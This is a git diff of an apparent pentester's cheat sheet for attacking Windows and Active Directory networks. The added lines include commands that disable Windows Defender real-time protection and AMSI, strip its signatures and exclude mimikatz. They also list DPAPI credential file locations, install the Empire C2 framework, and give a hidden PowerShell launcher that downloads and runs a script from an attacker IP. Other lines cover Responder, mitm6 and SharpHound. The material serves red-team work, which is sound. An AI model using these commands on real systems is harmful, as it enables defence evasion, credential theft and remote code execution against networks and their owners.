@@ -249,12 +249,12 @@ PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert
 ### SMB
 
 
-#### impacket-smbserver
+#### smbserver.py
 
 SMB server (communicate with Windows **[1]**):
 
 ```
-root@kali:$ impacket-smbserver -smb2support files `pwd`
+root@kali:$ smbserver.py -smb2support files `pwd`
 ```
 
 1. [serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)
@@ -262,7 +262,7 @@ root@kali:$ impacket-smbserver -smb2support files `pwd`
 Mount SMB in Windows with `net use`:
 
 ```
-root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
+root@kali:$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
 PS > net use Z: \\10.10.14.16\share
 PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
 ```
@@ -270,7 +270,7 @@ PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd!'
 Mount SMB in Windows with `New-PSDrive`:
 
 ```
-root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
+root@kali:$ smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share `pwd`
 PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
 PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
 Or
@@ -349,7 +349,7 @@ $ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
 
 ```
 $ git clone https://github.com/lgandx/Responder
-$ sudo ./Responder.py -I eth0 -wfrdv
+$ sudo ./Responder.py -I eth0 -wfrd -P -v
 ```
 
 
@@ -377,7 +377,7 @@ PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DH
 
 
 
-## ARP Spoofing (ARP Cache Poisoning)
+## ARP Spoofing
 
 Enable IP forwarding:
 
@@ -438,11 +438,18 @@ Deb dependencies (Ubuntu 18.04 LTS):
 * [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
 * [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
 
+Install:
+
 ```
-$ git clone https://github.com/fox-it/mitm6
+$ git clone https://github.com/fox-it/mitm6 ~/tools/mitm6 && cd ~/tools/mitm6
 $ python3 setup.py install
+```
+
+Run:
+
+```
+$ sudo smbserver.py -smb2support share `pwd`
 $ sudo mitm6.py -i eth0 -d megacorp.local
-$ sudo impacket-smbserver -smb2support share `pwd`
 ```
 
 
@@ -661,7 +668,7 @@ $ nmap -p 139,445 --script=/usr/share/nmap/scripts/smb-os-discovery --script-arg
 
 
 
-## Dump Users from DCE/RPC SAMR
+## Dump DCE/RPC SAMR
 
 
 
@@ -945,15 +952,6 @@ root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.
 
 
 
-# Mimikatz
-
-* [s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/](https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/)
-* [s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
-
-
-
-
-
 # Dump Credentials
 
 
@@ -1097,6 +1095,33 @@ Parse secrets:
 ```
 $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
 ```
+
+
+
+
+## DPAPI
+
+Master keys locations (hidden files, need `-Force`):
+
+```
+PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\
+PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Protect\
+```
+
+Credential files locations (hidden files, need `-Force`):
+
+```
+PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Credentials\
+PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\
+```
+
+
+
+
+## Obfuscate Mimikatz
+
+* [s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/](https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/)
+* [s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
 
 
 
@@ -1398,26 +1423,32 @@ PS > Invoke-Expression $dec
 
 ### Windows Defender
 
-Disable from command line (must be elevated):
+Disable real-time protection (proactive):
 
 ```
 PS > Set-MpPreference -DisableRealTimeMonitoring $true
 ```
 
-Add path to exclusions (must be elevated):
+Disable scanning all downloaded files and attachments, disable AMSI (reactive):
+
+```
+PS > Set-MpPreference -DisableIOAVProtection $true
+```
+
+Remove signatures (if Internet connection is present, they will be downloaded again):
+
+```
+PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+```
+
+Add path to exclusions:
 
 ```
 PS > $mimi = "C:\Users\snovvcrash\music\mimi\x64\mimikatz.exe"
 PS > Add-MpPreference -ExclusionPath $mimi -AttackSurfaceReductionOnlyExclusions $mimi
 ```
 
-Remove signatures (if Internet connection is present, it will be downloaded again):
-
-```
-PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
-```
-
-Download stager with triggering Defender to scan it:
+Download stager without triggering Defender to scan it:
 
 ```
 PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
@@ -2024,6 +2055,8 @@ PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Inte
 
 ### Potatoes
 
+* [jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+
 
 #### foxglovesec/RottenPotato
 
@@ -2108,7 +2141,16 @@ PS > Invoke-Command -ScriptBlock { whoami } -Session $s
 Start-Process with `-Credential`
 
 ```
-PS > Start-Process -FilePath "cmd" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred
+PS > Start-Process -FilePath "C:\Windows\System32\cmd.exe" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred
+```
+
+Process.Start:
+
+```
+PS > $pass = ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force 
+PS > $cred = New-Object System.Management.Automation.PSCredential ("snovvcrash", $pass)
+PS > $computer = "WORKSTATION1"
+PS > [System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c ping -n 1 10.10.13.37", $cred.Username, $cred.Password, $computer)
 ```
 
 
@@ -2717,7 +2759,7 @@ $ nikto -h http://127.0.0.1 -Cgidirs all
 
 
 
-# Reverse & PWN
+# RE
 
 
 
@@ -3392,15 +3434,17 @@ $ ./BloodHound
 
 ##### SharpHound
 
-Collect graphs via `Ingestors/SharpHound.ps1`:
+Collect graphs via `Collectors/SharpHound.ps1`:
 
 ```
+$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 > sharphound.ps1
 PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain megacorp.local -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
 ```
 
 Run session loop (\~2 hours for best results):
 
 ```
+$ curl -L https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe > sharphound.exe
 PS > .\SharpHound.exe -c SessionLoop
 ```
 
@@ -3485,15 +3529,36 @@ $ CME smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
 ```
 
 
+#### Empire
+
+* [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
+
+Install:
+
+```
+$ git clone https://github.com/BC-SECURITY/Empire ~/tools/Empire && cd ~/tools/Empire
+$ sudo STAGING_KEY=`echo 'H4ckTh3Pl4net!' | md5sum | cut -d' ' -f1` ./setup/install.sh
+$ sudo poetry install
+$ echo $'#!/usr/bin/env bash\n\nsudo poetry run python empire' > ~/tools/Empire/run_empire.sh
+$ chmod +x ~/tools/Empire/run_empire.sh
+```
+
+Pwsh launcher string:
+
+```
+PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/launcher.ps1')"
+```
+
+
 #### PowerView
 
 * [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
 * [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
 * [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
-* [PowerView 2.0](https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1)
-* [PowerView 3.0](https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1)
-* [PowerView 3.0 [New-GPOImmediateTask]](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1)
-* [PowerView 4.0 [fork]](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)
+* [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1)
+* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1)
+* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1) [\[New-GPOImmediateTask\]](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
+* [PowerView4.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) [\[fork\]](https://exploit.ph/powerview.html)
 
 ```
 $ curl -L https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1 > powerview2.ps1
@@ -3570,8 +3635,6 @@ PS > [Environment]::Is64BitOperatingSystem
 PS > [Environment]::Is64BitProcess
 PS > $ExecutionContext.SessionState.LanguageMode
 PS > [System.Net.Dns]::GetHostAddresses('hostname') | % {$_.IPAddressToString}
-
-PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn"
 ```
 
 Common AV process names:
@@ -3609,7 +3672,7 @@ PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll))
 * [Pentesting Exchange](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
 * [Abusing ACEs](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/ACEs_xmind.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
 * [Pentesting Wi-Fi](https://raw.githubusercontent.com/koutto/pi-pwnbox-rogueap/main/mindmap/WiFi-Hacking-MindMap-v1.png) · [koutto/pi-pwnbox-rogueap](https://github.com/koutto/pi-pwnbox-rogueap)
-* [Pentesting Web Applications](https://raw.githubusercontent.com/snovvcrash/cheatsheets/master/images/Web-Application-Pentest-Checklist.jpg) · [Chintan Gurjar](https://medium.com/@chintanfrogygurjar/professional-web-application-pentest-checklist-10ae5b2edbdd)
+* [Pentesting Web Applications](https://miro.medium.com/max/2400/1*8lN7TaTnlZSPEikpHFQnuA.png) · [Chintan Gurjar](https://medium.com/@chintanfrogygurjar/professional-web-application-pentest-checklist-10ae5b2edbdd)
 
 
 
